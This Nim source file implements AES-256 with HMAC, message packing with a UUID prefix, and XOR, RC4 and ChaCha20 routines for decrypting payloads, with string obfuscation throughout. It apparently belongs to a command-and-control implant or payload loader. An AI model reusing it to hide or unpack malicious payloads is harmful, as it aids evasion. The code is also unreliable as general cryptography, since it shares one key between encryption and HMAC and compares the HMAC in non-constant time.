import std/base64
import nimcrypto/[rijndael, bcmode, sysrand, hmac, sha2]
import strutils
import strenc

proc generateIV*(): seq[byte] =
  result = newSeq[byte](16)
  discard randomBytes(result[0].addr, 16)

proc encryptAES256*(data: seq[byte], key: seq[byte]): seq[byte] =
  let iv = generateIV()
  
  var paddedData = data
  let padding = 16 - (data.len mod 16)
  for i in 0..<padding:
    paddedData.add(byte(padding))
  
  var ctx: CBC[aes256]
  ctx.init(key, iv)
  
  var encrypted = newSeq[byte](paddedData.len)
  ctx.encrypt(paddedData, encrypted)
  ctx.clear()
  
  let ivAndCiphertext = iv & encrypted
  
  var hmacCtx: HMAC[sha256]
  hmacCtx.init(key)
  hmacCtx.update(ivAndCiphertext)
  let hmacResult = hmacCtx.finish()
  
  var hmacSeq = newSeq[byte](32)
  for i in 0..<32:
    hmacSeq[i] = hmacResult.data[i]
  
  result = ivAndCiphertext & hmacSeq

proc decryptAES256*(data: seq[byte], key: seq[byte]): seq[byte] =
  if data.len < 48:
    return @[]
  
  let hmacSize = 32
  let ivAndCiphertextLen = data.len - hmacSize
  let ivAndCiphertext = data[0..<ivAndCiphertextLen]
  let receivedHmac = data[ivAndCiphertextLen..^1]
  
  var hmacCtx: HMAC[sha256]
  hmacCtx.init(key)
  hmacCtx.update(ivAndCiphertext)
  let calculatedHmac = hmacCtx.finish()
  
  var hmacMatch = true
  for i in 0..<hmacSize:
    if receivedHmac[i] != calculatedHmac.data[i]:
      hmacMatch = false
      break
  
  if not hmacMatch:
    return @[]
  
  let iv = ivAndCiphertext[0..<16]
  let encrypted = ivAndCiphertext[16..^1]
  
  var ctx: CBC[aes256]
  ctx.init(key, iv)
  
  var decrypted = newSeq[byte](encrypted.len)
  ctx.decrypt(encrypted, decrypted)
  ctx.clear()
  
  if decrypted.len > 0:
    let padding = int(decrypted[^1])
    if padding > 0 and padding <= 16:
      result = decrypted[0..<(decrypted.len - padding)]
    else:
      result = decrypted
  else:
    result = @[]

proc encryptPayload*(message: string, key: seq[byte], uuid: string): string =
  let messageBytes = cast[seq[byte]](message)
  let encrypted = encryptAES256(messageBytes, key)
  let uuidBytes = cast[seq[byte]](uuid)
  let combined = uuidBytes & encrypted
  result = encode(combined)

proc decryptPayload*(data: string, key: seq[byte], uuidLen: int = 36): string =
  let decoded = decode(data)
  let decodedBytes = cast[seq[byte]](decoded)
  
  if decodedBytes.len <= uuidLen:
    return ""
  
  let encrypted = decodedBytes[uuidLen..^1]
  let decrypted = decryptAES256(encrypted, key)
  result = cast[string](decrypted)

type
  CryptoMethod* = enum
    cryptoNone = "none"
    cryptoXorSingle = obf("xor_single")
    cryptoXorMulti = obf("xor_multi")
    cryptoXorCounter = obf("xor_counter")
    cryptoXorFeedback = obf("xor_feedback")
    cryptoXorRolling = obf("xor_rolling")
    cryptoRc4 = obf("rc4")
    cryptoChacha20 = obf("chacha20")

proc xorSingle*(data: var seq[byte], key: byte) =
  for i in 0..<data.len:
    data[i] = data[i] xor key

proc xorMulti*(data: var seq[byte], key: seq[byte]) =
  let keylen = key.len
  for i in 0..<data.len:
    data[i] = data[i] xor key[i mod keylen]

proc xorCounter*(data: var seq[byte], key: seq[byte]) =
  let keylen = key.len
  for i in 0..<data.len:
    data[i] = data[i] xor key[i mod keylen] xor byte(i and 0xFF)

proc xorFeedback*(data: var seq[byte], key: seq[byte], iv: byte) =
  let keylen = key.len
  var prev = iv
  
  for i in 0..<data.len:
    let plaintext = data[i] xor key[i mod keylen] xor prev
    prev = data[i]
    data[i] = plaintext

proc xorRolling*(data: var seq[byte], key: seq[byte]) =
  let keylen = key.len
  var rollingKey: byte = 0
  
  for k in key:
    rollingKey = rollingKey xor k
  
  for i in 0..<data.len:
    data[i] = data[i] xor key[i mod keylen] xor rollingKey
    rollingKey = byte((rollingKey.int * 7 + 13) and 0xFF)

proc rc4*(data: var seq[byte], key: seq[byte]) =
  var
    S: array[256, byte]
    K: array[256, byte]
    i, j: int = 0
  
  for i in 0..255:
    S[i] = byte(i)
    K[i] = key[i mod key.len]
  
  j = 0
  for i in 0..255:
    j = (j + S[i].int + K[i].int) mod 256
    swap(S[i], S[j])
  
  i = 0
  j = 0
  for k in 0..<data.len:
    i = (i + 1) mod 256
    j = (j + S[i].int) mod 256
    swap(S[i], S[j])
    data[k] = data[k] xor S[(S[i].int + S[j].int) mod 256]



proc rotl32(a: uint32, b: int): uint32 {.inline.} =
  (a shl b) or (a shr (32 - b))

proc quarterRound(state: var array[16, uint32], a, b, c, d: int) {.inline.} =
  state[a] = state[a] + state[b]
  state[d] = rotl32(state[d] xor state[a], 16)
  
  state[c] = state[c] + state[d]
  state[b] = rotl32(state[b] xor state[c], 12)
  
  state[a] = state[a] + state[b]
  state[d] = rotl32(state[d] xor state[a], 8)
  
  state[c] = state[c] + state[d]
  state[b] = rotl32(state[b] xor state[c], 7)

proc chachaBlock(input: array[16, uint32]): array[64, byte] =
  var state = input
  
  for i in 0 ..< 10:
    quarterRound(state, 0, 4,  8, 12)
    quarterRound(state, 1, 5,  9, 13)
    quarterRound(state, 2, 6, 10, 14)
    quarterRound(state, 3, 7, 11, 15)
    
    quarterRound(state, 0, 5, 10, 15)
    quarterRound(state, 1, 6, 11, 12)
    quarterRound(state, 2, 7,  8, 13)
    quarterRound(state, 3, 4,  9, 14)
  
  for i in 0 ..< 16:
    state[i] = state[i] + input[i]
  
  var output: array[64, byte]
  for i in 0 ..< 16:
    let val = state[i]
    output[i * 4 + 0] = byte(val and 0xFF)
    output[i * 4 + 1] = byte((val shr 8) and 0xFF)
    output[i * 4 + 2] = byte((val shr 16) and 0xFF)
    output[i * 4 + 3] = byte((val shr 24) and 0xFF)
  
  return output

proc bytesToUint32LE(bytes: openArray[byte], offset: int): uint32 =
  result = uint32(bytes[offset + 0]) or
           (uint32(bytes[offset + 1]) shl 8) or
           (uint32(bytes[offset + 2]) shl 16) or
           (uint32(bytes[offset + 3]) shl 24)

proc chacha20*(data: var seq[byte], key: seq[byte], nonce: seq[byte]) =
  if key.len != 32:
    raise newException(ValueError, obf("ChaCha20 key must be exactly 32 bytes, got ") & $key.len)
  if nonce.len != 12:
    raise newException(ValueError, obf("ChaCha20 nonce must be exactly 12 bytes, got ") & $nonce.len)
  
  var state: array[16, uint32]
  
  state[0] = 0x61707865'u32
  state[1] = 0x3320646e'u32
  state[2] = 0x79622d32'u32
  state[3] = 0x6b206574'u32
  
  for i in 0 ..< 8:
    state[4 + i] = bytesToUint32LE(key, i * 4)
  
  state[12] = 0'u32
  
  for i in 0 ..< 3:
    state[13 + i] = bytesToUint32LE(nonce, i * 4)
  
  var pos = 0
  while pos < data.len:
    let keystream = chachaBlock(state)
    
    let bytesToProcess = min(64, data.len - pos)
    for i in 0 ..< bytesToProcess:
      data[pos + i] = data[pos + i] xor keystream[i]
    
    pos += bytesToProcess
    
    state[12] = state[12] + 1
    if state[12] == 0:
      state[13] = state[13] + 1

proc parseKey*(keyStr: string): seq[byte] =
  result = @[]
  
  if keyStr.startsWith(obf("0x")) or keyStr.startsWith(obf("0X")):
    let hexVal = parseHexInt(keyStr)
    result.add(byte(hexVal))
  else:
    for c in keyStr:
      result.add(byte(c))

proc decryptPayload*(data: var seq[byte], encryptionMethod: string, 
                       key: string, iv: string = "", nonce: string = "") =
  if encryptionMethod == "" or encryptionMethod == "none":
    return
  
  let cryptoMethod = parseEnum[CryptoMethod](encryptionMethod)
  let keyBytes = parseKey(key)
  
  case cryptoMethod
  of cryptoNone:
    discard
  
  of cryptoXorSingle:
    xorSingle(data, keyBytes[0])
  
  of cryptoXorMulti:
    xorMulti(data, keyBytes)
  
  of cryptoXorCounter:
    xorCounter(data, keyBytes)
  
  of cryptoXorFeedback:
    var ivByte: byte = 0xAA
    if iv != "":
      if iv.startsWith(obf("0x")) or iv.startsWith(obf("0X")):
        ivByte = byte(parseHexInt(iv))
      else:
        ivByte = byte(parseInt(iv))
    xorFeedback(data, keyBytes, ivByte)
  
  of cryptoXorRolling:
    xorRolling(data, keyBytes)
  
  of cryptoRc4:
    rc4(data, keyBytes)
  
  of cryptoChacha20:
    var nonceBytes: seq[byte] = @[]
    for c in nonce:
      nonceBytes.add(byte(c))
    
    while nonceBytes.len < 12:
      nonceBytes.add(byte(0))
    if nonceBytes.len > 12:
      nonceBytes.setLen(12)
    
    var key32 = keyBytes
    while key32.len < 32:
      key32.add(byte(0))
    if key32.len > 32:
      key32.setLen(32)
    
    chacha20(data, key32, nonceBytes)

